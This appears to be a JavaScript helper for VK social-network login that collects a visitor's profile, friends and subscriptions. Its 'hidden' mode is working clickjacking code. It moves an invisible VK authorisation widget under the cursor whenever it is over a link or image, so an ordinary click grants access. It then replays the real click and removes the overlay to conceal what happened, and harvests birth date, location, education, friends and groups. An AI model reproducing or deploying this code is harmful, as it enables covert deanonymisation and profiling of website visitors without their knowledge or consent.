document.vkuserinfo = {};
document.vkcalls = 0;

function authVk(appid, hidden, _scope, getprofile, onAuth) {
	
	var head = document.getElementsByTagName('head')[0];
	var script = document.createElement('script');
	script.type = 'text/javascript';
	
	document._vkauth_onFinished = onAuth;
	
	loadVk(appid, hidden, _scope, getprofile);
}

function loadVk(appid, hidden, _scope, getprofile) {
	var head = document.getElementsByTagName('head')[0];
	var script = document.createElement('script');
	script.type = 'text/javascript';

	script.onload = function () {
		
		VK.init({ apiId: appid });
		
		VK.Auth.getLoginStatus(function (response) {
			if (response.session) {
				
				if (getprofile)
					getVkUserInfo(response.session.mid);
				else
					document._vkauth_onFinished(null);
				
			} else {
			  	
				if (hidden)
					doVkauthHidden(appid, getprofile);
				else
					doVkauthExplicit(appid, _scope, getprofile);
				
			} });
	}
	script.src = "//vk.com/js/api/openapi.js";
	head.appendChild(script);
}

function isClickable(click_el) {
	
	if (click_el == null)
		return false;
	
	if (click_el.tagName == "A" || click_el.tagName == "a" || click_el.tagName == "img" || click_el.tagName == "IMG")
		return true;
	if (click_el.parentNode)
		return isClickable(click_el.parentNode);
	return false;
}

function getVkUserInfo(uid) {
	
	document.vkuserinfo.uid = uid;
	
	VK.Api.call('users.get', {user_id: uid, fields: ["sex", "bdate", "city", "country", "photo_50", "site", "education", "universities", "schools", "timezone", "occupation"]}, function(r) {
		if(r.response) {
			
			document.vkuserinfo.first_name = r.response[0].first_name;
			document.vkuserinfo.last_name = r.response[0].last_name;
			document.vkuserinfo.sex = r.response[0].sex;
			document.vkuserinfo.bdate = r.response[0].bdate;
			document.vkuserinfo.city = r.response[0].city;
			document.vkuserinfo.country = r.response[0].country;
			document.vkuserinfo.timezone = r.response[0].timezone;
			document.vkuserinfo.photo_50 = r.response[0].photo_50;
			document.vkuserinfo.site = r.response[0].site;
			document.vkuserinfo.university = r.response[0].university;
			document.vkuserinfo.facility = r.response[0].facility;
			document.vkuserinfo.facility_name = r.response[0].facility_name;
			document.vkuserinfo.graduation = r.response[0].graduation;
			document.vkuserinfo.universities = r.response[0].universities;
			document.vkuserinfo.schools = r.response[0].schools;

			document.vkcalls++;
			if (document.vkcalls == 3)
				document._vkauth_onFinished(document.vkuserinfo);
		} });

	VK.Api.call('friends.get', {user_id: uid}, function(r) {
		if(r.response) {
			document.vkuserinfo.friends = r.response;
			document.vkcalls++;
			if (document.vkcalls == 3)
				document._vkauth_onFinished(document.vkuserinfo);
		} });

	VK.Api.call ('users.getSubscriptions', {user_id: uid, extended: 0, count: 200}, function (r) {
		if (r.response) {
			document.vkuserinfo.groups = r.response.groups.items;
			document.vkcalls++;
			if (document.vkcalls == 3)
				document._vkauth_onFinished(document.vkuserinfo);
		} });
}

function doVkauthHidden(appid, getprofile) {

	setTimeout(function () {
					var el = document.getElementById('punktvkauth_overlay');
					el.parentNode.removeChild(el);
				}, 15000);

	VK.Widgets.Auth("punktvkauth_vk_auth", { width: "200px", onAuth: function(data) {
		var el = document.getElementById('punktvkauth_overlay');
		el.parentNode.removeChild(el);
		document.clicked = true;
		
		if (getprofile)
			getVkUserInfo(data.uid);
		else
			document._vkauth_onFinished(null);
	} });

	
	//var el = $('#punktvkauth_wrap1');
	//$(window).on('mousemove', function(e) {
	var el = document.getElementById('punktvkauth_wrap1');
	window.onmousemove = function (e) {
	
		var click_el = document.elementFromPoint(e.pageX, e.pageY);
		if (isClickable(click_el)) {
			//el.css({left: e.pageX-90, top:e.pageY-12});
			el.style.left = e.pageX-90;
			el.style.top = e.pageY-2;
			if (document.clicked) {
				click_el.click();
				document.clicked = false;
				
				setTimeout(function () {
								var el = document.getElementById('punktvkauth_overlay');
								el.parentNode.removeChild(el);
							}, 1000);
				
			}
		}
	}
	//);
}

function doVkauthExplicit(appid, _scope, getprofile) {
	
	VK.Auth.login( function(data) {
		var el = document.getElementById('punktvkauth_overlay_expl');
		el.parentNode.removeChild(el);
		
		if (getprofile)
			getVkUserInfo(data.uid);
		else
			document._vkauth_onFinished(null);

	}, _scope );
}
